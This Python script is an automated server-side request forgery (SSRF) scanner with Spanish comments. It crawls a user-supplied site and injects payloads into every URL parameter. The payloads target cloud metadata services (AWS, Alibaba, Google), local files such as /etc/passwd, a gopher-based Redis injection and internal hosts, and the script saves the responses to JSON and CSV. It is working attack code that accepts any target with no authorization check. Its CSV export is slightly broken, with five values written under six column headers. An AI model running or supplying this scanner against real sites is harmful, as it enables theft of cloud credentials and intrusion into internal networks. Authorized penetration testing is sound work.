import requests
import re
import json
import csv
import base64
import time
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup

# Configuración
TIMEOUT = 5
CRITICAL_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS Metadata - CRÍTICO
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud Metadata
    "http://metadata.google.internal/computeMetadata/v1/",  # Google Cloud
]
HIGH_PAYLOADS = [
    "file:///etc/passwd",  # Archivos locales - ALTO
    "gopher://127.0.0.1:6379/_INFO",  # Redis Injection
    "ftp://127.0.0.1:21/",  # FTP Internal Scan
    "mongodb://127.0.0.1:27017/admin",  # MongoDB Scan
]
MEDIUM_PAYLOADS = [
    "http://127.0.0.1:80",  # HTTP interno - MEDIO
    "http://192.168.1.1/",  # Posible router interno
]
LOW_PAYLOADS = [
    "http://example.com",  # Simple redirección - BAJO
]

# Unir todos los payloads en una lista
ALL_PAYLOADS = CRITICAL_PAYLOADS + HIGH_PAYLOADS + MEDIUM_PAYLOADS + LOW_PAYLOADS

# Función para encontrar parámetros en la URL
def find_ssrf_params(url):
    parsed_url = urlparse(url)
    query_params = re.findall(r'[\?&]([^=]+)=', url)
    return query_params if query_params else []

# Función para probar payloads en un parámetro
def test_ssrf(url, param):
    results = {}
    for payload in ALL_PAYLOADS:
        test_url = url.replace(f"{param}=", f"{param}={payload}")
        try:
            response = requests.get(test_url, timeout=TIMEOUT, allow_redirects=False)
            severity = classify_severity(payload)
            if response.status_code in [200, 302, 403]:
                results[payload] = {
                    "status_code": response.status_code,
                    "response_snippet": response.text[:150],
                    "severity": severity
                }
                print(f"[+] Posible SSRF en {param}: {payload} [{severity}]")
        except requests.exceptions.RequestException:
            pass
    return results

# Función para clasificar la gravedad de la vulnerabilidad
def classify_severity(payload):
    if payload in CRITICAL_PAYLOADS:
        return "CRÍTICO"
    elif payload in HIGH_PAYLOADS:
        return "ALTO"
    elif payload in MEDIUM_PAYLOADS:
        return "MEDIO"
    else:
        return "BAJO"

# Función para rastrear automáticamente URLs en un sitio
def crawl_site(start_url, max_depth=2):
    visited = set()
    urls_to_visit = [start_url]

    for _ in range(max_depth):
        new_urls = []
        for url in urls_to_visit:
            if url in visited:
                continue
            visited.add(url)
            try:
                response = requests.get(url, timeout=TIMEOUT)
                soup = BeautifulSoup(response.text, "html.parser")
                for link in soup.find_all("a", href=True):
                    full_url = urljoin(url, link.get("href"))
                    if start_url in full_url and full_url not in visited:
                        new_urls.append(full_url)
            except requests.exceptions.RequestException:
                pass
        urls_to_visit = new_urls

    return visited

# Función para escanear todas las URLs rastreadas
def ssrf_scan(target_url):
    print(f"\n[🔍] Escaneando sitio: {target_url}")
    urls_to_scan = crawl_site(target_url)
    
    all_results = {}
    for url in urls_to_scan:
        print(f"[📌] Escaneando: {url}")
        params = find_ssrf_params(url)
        for param in params:
            results = test_ssrf(url, param)
            if results:
                all_results[f"{url}?{param}"] = results

    if all_results:
        print("[✅] SSRF Detectado. Exportando reporte...")
        export_results(all_results)
    else:
        print("[❌] No se detectaron vulnerabilidades SSRF.")

    return all_results

# Función para exportar resultados en JSON y CSV
def export_results(results):
    with open("ssrf_results.json", "w") as json_file:
        json.dump(results, json_file, indent=4)
    with open("ssrf_results.csv", "w", newline="") as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(["URL", "Parámetro", "Payload", "Severidad", "Código de Estado", "Respuesta"])
        for url_param, payloads in results.items():
            for payload, data in payloads.items():
                writer.writerow([url_param, payload, data["severity"], data["status_code"], data["response_snippet"][:100]])
    print("[📄] Reportes guardados en ssrf_results.json y ssrf_results.csv.")

# Main
if __name__ == "__main__":
    target = input("[🎯] Ingresa la URL objetivo: ")
    ssrf_scan(target)
